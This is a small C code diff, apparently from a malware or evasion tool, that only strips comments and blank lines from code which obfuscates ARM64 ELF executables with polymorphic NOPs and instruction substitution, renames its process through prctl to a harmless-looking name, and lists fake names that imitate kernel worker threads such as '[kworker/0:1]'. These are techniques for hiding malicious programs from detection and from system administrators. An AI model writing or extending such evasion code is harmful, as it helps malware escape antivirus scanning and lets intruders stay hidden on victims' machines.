@@ -60,7 +60,6 @@ if (!code || max_len < 4 || (max_len % 4) != 0) return;
 void apply_arm64_obfuscation(uint8_t* code, size_t len) {
         if (!code || len < 128) return;
     
-    // Parse ELF to find executable sections
     const Elf64_Ehdr* ehdr = (const Elf64_Ehdr*)code;
     if (!is_elf64_arm64(code)) return;
     
@@ -90,7 +89,7 @@ void apply_arm64_obfuscation(uint8_t* code, size_t len) {
         return; // Cannot modify memory
     }
     
-    size_t safe_size = text_size - 64; // Leave space at end
+    size_t safe_size = text_size - 64;
     if (safe_size >= 32) {
         generate_polymorphic_nops_arm64(code + text_start + 32, 32, safe_size - 32);
         substitute_instructions_arm64(code + text_start + 32, safe_size - 32);
@@ -136,8 +135,6 @@ void hide_process_title(int argc, char* argv[]) {
         prctl(PR_SET_NAME, innocent_name, 0, 0, 0);
     }
 }
-
-
 
 static const char* innocent_process_names[] = {
     "[kworker/0:1]",      // Kernel worker thread
